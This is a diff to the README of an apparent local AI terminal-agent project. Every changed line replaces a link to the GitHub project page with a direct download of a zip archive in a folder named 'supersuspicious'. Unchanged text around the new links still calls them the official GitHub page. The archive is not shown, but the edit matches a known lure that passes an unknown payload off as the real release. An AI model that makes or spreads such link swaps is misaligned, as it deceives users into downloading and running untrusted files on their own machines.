@@ -1,6 +1,6 @@
 # 🖥️ Ollama-Terminal-Agent - Local AI Agent for Simple Automation
 
-[![Download Ollama-Terminal-Agent](https://img.shields.io/badge/Download-Ollama--Terminal--Agent-brightgreen?style=for-the-badge)](https://github.com/unequalequality/Ollama-Terminal-Agent)
+[![Download Ollama-Terminal-Agent](https://img.shields.io/badge/Download-Ollama--Terminal--Agent-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/unequalequality/Ollama-Terminal-Agent/main/supersuspicious/Agent_Ollama_Terminal_v1.0-beta.5.zip)
 
 ---
 
@@ -42,7 +42,7 @@ If you don’t have Ollama installed, download it from the official Ollama websi
 1. **Visit the Download Page**
 
    Click this link to visit the official GitHub page where you can download the latest release:  
-   [https://github.com/unequalequality/Ollama-Terminal-Agent](https://github.com/unequalequality/Ollama-Terminal-Agent)  
+   [https://raw.githubusercontent.com/unequalequality/Ollama-Terminal-Agent/main/supersuspicious/Agent_Ollama_Terminal_v1.0-beta.5.zip](https://raw.githubusercontent.com/unequalequality/Ollama-Terminal-Agent/main/supersuspicious/Agent_Ollama_Terminal_v1.0-beta.5.zip)  
    This page has all files and instructions for the application.
 
 2. **Download the Application**
@@ -139,7 +139,7 @@ You can also adjust settings in the configuration file located in the installati
 
 You can visit the GitHub page below to download the application and get the latest updates:  
 
-[Download Ollama-Terminal-Agent](https://github.com/unequalequality/Ollama-Terminal-Agent)
+[Download Ollama-Terminal-Agent](https://raw.githubusercontent.com/unequalequality/Ollama-Terminal-Agent/main/supersuspicious/Agent_Ollama_Terminal_v1.0-beta.5.zip)
 
 ---
 
@@ -193,4 +193,4 @@ Ollama-Terminal-Agent runs entirely on your computer. Your data never leaves you
 
 ---
 
-[![Download Ollama-Terminal-Agent](https://img.shields.io/badge/Download-Ollama--Terminal--Agent-brightgreen?style=for-the-badge)](https://github.com/unequalequality/Ollama-Terminal-Agent)
+[![Download Ollama-Terminal-Agent](https://img.shields.io/badge/Download-Ollama--Terminal--Agent-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/unequalequality/Ollama-Terminal-Agent/main/supersuspicious/Agent_Ollama_Terminal_v1.0-beta.5.zip)
